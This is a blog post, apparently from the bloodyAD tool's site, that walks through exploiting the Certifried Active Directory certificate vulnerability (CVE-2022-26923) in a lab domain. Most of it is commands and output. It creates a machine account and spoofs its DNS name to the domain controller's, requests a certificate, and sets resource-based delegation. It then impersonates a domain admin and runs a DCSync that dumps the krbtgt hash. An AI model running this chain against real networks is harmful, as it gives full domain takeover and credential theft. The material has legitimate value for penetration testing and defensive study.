---
title: Exploiting Certifried (CVE-2022-26923)
summary: Discover how to exploit the certifried vulnerability easily with bloodyAD.
date: 2024-05-11
aliases: [/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923,/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html]
# Featured image
# Place an image named `featured.jpg/png` in this page's folder and customize its options here.
# image:
#   caption: 'Image credit: [**Unsplash**](https://unsplash.com)'

authors:
  - soka
  - admin

tags:
  - Active Directory
  - Authentication
  - CVE
  - Exploit

categories:
  - bloodyAD
---
A new ADCS privesc was released: Certifried (CVE-2022-26923) with this [blogpost](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4) after Microsoft patched it.
Here is an example on how to exploit this vulnerability with [bloodyAD](https://github.com/CravateRouge/bloodyAD) and PKINIT not supported from Linux.

## Linux

We need to own a computer, either we pwned one or we can create one if `ms-DS-MachineAccountQuota`>0:

```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 get object 'DC=crashlab,DC=local' --attr ms-DS-MachineAccountQuota                     

distinguishedName: DC=crashlab,DC=local
ms-DS-MachineAccountQuota: 10
```

We create a Computer object `cve` in the LDAP:
```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 addComputer cve 'CVEPassword1234*'

[+] cve created
```

Then we set the attribute `dNSHostName` (empty when we created the object) to match the Domain Controller DNS Hostname: `CRASHDC.crashlab.local`.

```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 set object 'CN=cve,CN=Computers,DC=crashlab,DC=local' dNSHostName -v CRASHDC.crashlab.local

[+] CN=cve,CN=Computers,DC=crashlab,DC=local's dnsHostName has been updated
```

To check if the attribute has been correctly set:
```ps1
> python bloodyAD.py -d crashlab.local -u testuser -p 'totoTOTOtoto1234*' --host 10.100.10.12 get object 'CN=cve,CN=Computers,DC=crashlab,DC=local' --attr dNSHostName                  

distinguishedName: CN=cve,CN=Computers,DC=crashlab,DC=local
dNSHostName: CRASHDC.crashlab.local
```

Now we can use [Certipy](https://github.com/ly4k/Certipy) to request a certificate for the computer `cve`:
```ps1
# 10.100.10.13 is the ADCS server
> certipy req 'crashlab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.100.10.12 -ca crashlab-ADCS-CA
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with DNS Host Name 'CRASHDC.crashlab.local'
[*] Saved certificate and private key to 'crashdc.pfx'

```

Now we'll try to get a TGT using [Certipy](https://github.com/ly4k/Certipy) with the certificate requested above:
```ps1
> certipy auth -pfx ./crashdc.pfx -dc-ip 10.100.10.12
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: crashdc$@crashlab.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

PKINIT doesn't seem to work on this AD, let's try RBCD technique with [bloodyAD](https://github.com/CravateRouge/bloodyAD) and its certificate authentication feature:
```ps1
> openssl pkcs12 -in crashdc.pfx -out crashdc.pem -nodes
> python bloodyAD.py -d crashlab.local  -c ":crashdc.pem" -u 'cve$' --host 10.100.10.12 add rbcd 'CRASHDC$' 'CVE$'
[+] CVE$ SID is: S-1-5-21-1945936656-2616711065-1665664270-1134             
[+] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity correctly set        
[+] Delegation rights modified successfully!                                                                           
CVE$ can now impersonate users on CRASHDC$ via S4U2Proxy
```

Delegation rights are set up, we can now use [impacket](https://github.com/SecureAuthCorp/impacket) `getST.py` to impersonate a Domain admin (`emacron` in our case) on CRASHDC$ and fetch a TGT: 
```ps1
> getST.py -spn LDAP/CRASHDC.CRASHLAB.LOCAL -impersonate emacron -dc-ip 10.100.10.12 'crashlab.local/cve$:CVEPassword1234*'                 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                                               
                                                                                                                       
[*] Getting TGT for user                                                                                               
[*] Impersonating emacron                                                                                              
[*]     Requesting S4U2self                                                                                            
[*]     Requesting S4U2Proxy
[*] Saving ticket in emacron.ccache

> cp emacron.ccache /tmp/
> export KRB5CCNAME=/tmp/emacron.ccache
```

Finally we'll use [impacket](https://github.com/SecureAuthCorp/impacket) `secretsdump.py` to perform a DCSync with the exported TGT:
```ps1

> secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'crashlab.local/emacron@crashdc.crashlab.local' -k -no-pass -dc-ip 10.100.10.12 -target-ip 10.100.10.12 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:492850f62466ef2bd1f4a56f112e01f1::: (status=Disabled)
[*] Cleaning up...
```
